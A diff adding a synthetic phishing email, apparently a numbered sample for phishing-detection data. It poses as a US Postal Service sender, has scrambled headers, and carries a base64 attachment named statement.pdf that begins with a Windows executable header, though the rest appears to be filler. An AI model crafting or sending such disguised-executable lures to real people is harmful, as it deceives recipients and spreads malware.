@@ -1,0 +1,50 @@
+From: notice@usps-tracking.icu
+To: victim51@example.com
+Subject: Power outage maintenance window [ref A0D3E43]
+Date: Tue, 01 Mar 2002 16:59:00 -0500
+Message-ID: <phish-51-124ad12b-8db4-4057-813a-0b59266ee254@usps-tracking.icu>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 10 Mar 2002 21:45:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 20 Mar 2002 15:11:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 01 Mar 2002 15:08:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 02 Mar 2002 16:12:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 05 Mar 2002 15:51:00 -0500
+Received: from relay5 (relay5.example.net [192.0.2.105]) by mx5.example.com; Tue, 11 Mar 2002 17:44:00 -0500
+Received: from relay6 (relay6.example.net [192.0.2.106]) by mx6.example.com; Tue, 11 Mar 2002 12:56:00 -0500
+Received: from relay7 (relay7.example.net [192.0.2.107]) by mx7.example.com; Tue, 20 Mar 2002 12:58:00 -0500
+Return-Path: <notice@usps-tracking.icu>
+Reply-To: notice@usps-tracking.icu
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=usps-tracking.icu; dkim=pass header.d=usps-tracking.icu; dmarc=pass header.from=usps-tracking.icu
+Received-SPF: pass (mx.example.com: domain of notice@usps-tracking.icu designates 192.0.2.31 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=usps-tracking.icu; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="bnd-p-51-34d4959e"
+
+--bnd-p-51-34d4959e
+Content-Type: text/plain; charset="UTF-8"
+
+Hi,
+
+Please review the attached schedule before Friday. No action needed beyond that.
+Reference: A0D3E43
+
+Thanks,
+Colleague
+--bnd-p-51-34d4959e
+Content-Type: application/pdf; name="statement.pdf"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="statement.pdf"
+
+TVqQAHk91JPdRyVdJfhm4hly8e7yM8UfkDnO4lGZBd5aJNhxNSX9aJUYVA9rLmo73z1UnYd/IiQs
+6a6iVLLaAeCcm6ms0daJeYM8d8Pf1Gq5yD6DPMky2xN0qTLv0/pA2VeqlbGrF/sAI7Umf8hic0is
+D8gN/LF1MNkgiCSoNJt93GkOI0PJ9PLLIG2tkOdllOPI+uIkyzP2UwgxaJuSGxiLHjAuOY6+yuke
+NCl0Dcj7mxi2H1tMI/eNtxFKl+CrcUXkcr5VW2kcrxe9eTw897fY1FOTJYfltdO8OytOghURLkcC
+mUUvy3Bu/L7+8wnne3FTCmSvdwstvjN1fYUouN4JAd2pgDtZIKjUYerywee57TAiV32PgKTOKNUY
+9spsoaddLffa+ka1Y42jg6eIy/uu7ZwTAL+MMIp3/xAsiBfZ+71kxzzLfTkrkZg9tIgM3fsB4MeP
+N955lLWKpfPTdXw6zJpxBG/nClehChbJwVQlZ8TsxlFTLEAznQKzy3GNA53OrVmVCYCv/nT8w9Pc
+AXUFx4OIi0HiGtp/CTvk1V1kOZSdnIMTxSIsmo4p56YUHgQM25vc4GbtJj0ecihMM1tsnbPo+bvp
+Gswox6eFkRaLFqVUA9dNbKvWQ4PbyXwynG/W3AC4RGLVzKexqpfUZ847N6GGlq3RxT0Gv/jbvZdV
+bn/RcEvWRdn6xGoKv5uExl7nBWGnn5rdqI9K+3TGHZ3Ntnjm2j/yOhtKhLxvyr5jTh8A7+32cTtG
+hNQR2CkfLvoqB8UxMZLTuuJUTEnf3ouOywm+4hM+dv01r60sLOgOV2xuWmNs5wYvEpqkQ1k7FoNq
+v4nIh1LexTXWajN0rQ==
+
+--bnd-p-51-34d4959e--
